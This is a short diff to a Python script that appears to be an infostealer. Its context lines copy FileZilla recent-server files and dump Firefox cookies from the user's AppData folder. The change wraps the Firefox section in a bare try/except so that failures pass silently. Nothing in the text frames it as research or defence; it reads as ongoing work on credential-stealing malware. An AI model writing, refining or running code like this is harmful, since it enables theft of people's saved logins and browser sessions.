@@ -56,8 +56,7 @@ file_path = os.path.join("C:/Users", user, "AppData/Roaming/FileZilla/recentserv
 if os.path.isfile(file_path):
     shutil.copy(file_path, cdfilezilla)
 #firefox
-file_path = "C:\Users", user, "AppData\Roaming\Mozilla\Firefox"
-if  os.path.exists(file_path)  == True :
+try:
     mozilla_profile = os.path.join(os.getenv('APPDATA'), r'Mozilla\Firefox')
     mozilla_profile_ini = os.path.join(mozilla_profile, r'profiles.ini')
     if os.path.exists(mozilla_profile_ini):
@@ -101,6 +100,8 @@ if  os.path.exists(file_path)  == True :
             f.write(get_firefox_cookies())
     except:
         pass
+except:
+    pass
 
     profiles_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
     profiles = os.listdir(profiles_path)
